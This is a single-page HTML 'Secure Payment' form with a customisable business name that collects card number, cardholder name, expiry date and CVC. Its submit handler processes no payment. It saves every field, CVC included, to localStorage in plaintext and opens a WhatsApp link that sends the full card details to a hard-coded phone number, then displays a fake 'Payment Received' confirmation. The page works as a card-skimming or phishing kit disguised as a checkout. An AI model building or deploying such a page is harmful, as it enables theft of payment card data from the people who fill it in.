<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Form</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 100%;
            padding: 40px;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 3px solid #667eea;
            padding-bottom: 20px;
        }
        .business-input {
            display: flex;
            justify-content: center;
            margin-bottom: 12px;
        }
        .business-input input {
            padding: 10px 15px;
            border: 2px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            width: 220px;
            text-align: center;
        }
        .business-input input:focus {
            outline: none;
            border-color: #667eea;
        }
        h1 {
            font-size: 26px;
            color: #333;
            margin-bottom: 5px;
        }
        .tagline {
            color: #888;
            font-size: 13px;
        }
        .card-preview {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 25px;
            border-radius: 12px;
            margin-bottom: 25px;
            text-align: center;
            min-height: 140px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        .card-icon { font-size: 35px; }
        .card-number-display {
            font-size: 20px;
            letter-spacing: 3px;
            font-family: 'Courier New', monospace;
            margin: 15px 0;
        }
        .card-details {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
        }
        .form-group { margin-bottom: 18px; }
        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 7px;
        }
        input {
            width: 100%;
            padding: 12px 14px;
            border: 2px solid #e0e0e0;
            border-radius: 7px;
            font-size: 14px;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
            background: #f8f9ff;
        }
        .row {
            display: grid;
            grid-template-columns: 1.5fr 1fr;
            gap: 15px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 7px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover { transform: translateY(-3px); }
        button:disabled { opacity: 0.6; }
        .success-message {
            display: none;
            background: #34a853;
            color: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 20px;
        }
        .success-message.show { display: block; }
        .loading {
            display: none;
            text-align: center;
            color: #667eea;
            padding: 10px;
        }
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="business-input">
                <input type="text" id="businessName" placeholder="Business Name" value="Payment Hub">
            </div>
            <h1 id="displayBusiness">Payment Hub</h1>
            <p class="tagline">Secure Payment</p>
        </div>

        <div class="success-message" id="successMessage">
            <h2>✓ Payment Received!</h2>
            <p>WhatsApp notification sent</p>
        </div>

        <div class="card-preview">
            <div class="card-icon">💳</div>
            <div class="card-number-display" id="cardNumberDisplay">•••• •••• •••• ••••</div>
            <div class="card-details">
                <div id="cardHolderDisplay">CARDHOLDER</div>
                <div id="cardExpiryDisplay">MM/YY</div>
            </div>
        </div>

        <form id="paymentForm">
            <div class="form-group">
                <label>Card Number *</label>
                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
            </div>

            <div class="form-group">
                <label>Cardholder Name *</label>
                <input type="text" id="cardHolder" placeholder="John Smith" required>
            </div>

            <div class="row">
                <div class="form-group">
                    <label>Expiry *</label>
                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                </div>
                <div class="form-group">
                    <label>CVC *</label>
                    <input type="text" id="cvc" placeholder="123" maxlength="4" required>
                </div>
            </div>

            <div class="loading" id="loadingIndicator">
                <span class="spinner"></span>Processing...
            </div>

            <button type="submit">SUBMIT PAYMENT</button>
        </form>
    </div>

    <script>
        const businessInput = document.getElementById('businessName');
        const displayBusiness = document.getElementById('displayBusiness');
        const cardNumberInput = document.getElementById('cardNumber');
        const cardNumberDisplay = document.getElementById('cardNumberDisplay');
        const cardHolderInput = document.getElementById('cardHolder');
        const cardHolderDisplay = document.getElementById('cardHolderDisplay');
        const expiryInput = document.getElementById('expiry');
        const expiryDisplay = document.getElementById('cardExpiryDisplay');
        const cvcInput = document.getElementById('cvc');
        const form = document.getElementById('paymentForm');
        const successMessage = document.getElementById('successMessage');
        const loadingIndicator = document.getElementById('loadingIndicator');

        businessInput.addEventListener('input', function() {
            displayBusiness.textContent = this.value || 'Payment Hub';
        });

        cardNumberInput.addEventListener('input', function() {
            let value = this.value.replace(/\s/g, '').replace(/\D/g, '').slice(0, 16);
            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
            this.value = formatted;
            if (value.length > 0) {
                let masked = value.replace(/./g, '•').slice(0, -4) + value.slice(-4);
                cardNumberDisplay.textContent = masked.match(/.{1,4}/g)?.join(' ') || masked;
            } else {
                cardNumberDisplay.textContent = '•••• •••• •••• ••••';
            }
        });

        cardHolderInput.addEventListener('input', function() {
            cardHolderDisplay.textContent = (this.value || 'CARDHOLDER').toUpperCase();
        });

        expiryInput.addEventListener('input', function() {
            let value = this.value.replace(/\D/g, '').slice(0, 4);
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2);
            }
            this.value = value;
            expiryDisplay.textContent = value || 'MM/YY';
        });

        cvcInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 4);
        });

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            loadingIndicator.style.display = 'block';

            const message = `Payment Received!\n\nBusiness: ${businessInput.value}\nCardholder: ${cardHolderInput.value}\nCard: ${cardNumberInput.value}\nExpiry: ${expiryInput.value}\nCVC: ${cvcInput.value}\nTime: ${new Date().toLocaleString()}`;
            
            const whatsappNumber = '441337123327';
            const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;

            localStorage.setItem('payment_' + Date.now(), JSON.stringify({
                business: businessInput.value,
                cardholder: cardHolderInput.value,
                card: cardNumberInput.value,
                expiry: expiryInput.value,
                cvc: cvcInput.value,
                time: new Date().toLocaleString()
            }));

            setTimeout(() => {
                successMessage.classList.add('show');
                loadingIndicator.style.display = 'none';
                form.style.display = 'none';
                
                window.open(whatsappUrl, '_blank');

                setTimeout(() => {
                    form.reset();
                    form.style.display = 'block';
                    successMessage.classList.remove('show');
                    cardNumberDisplay.textContent = '•••• •••• •••• ••••';
                    cardHolderDisplay.textContent = 'CARDHOLDER';
                    expiryDisplay.textContent = 'MM/YY';
                }, 5000);
            }, 1000);
        });
    </script>
</body>
</html>
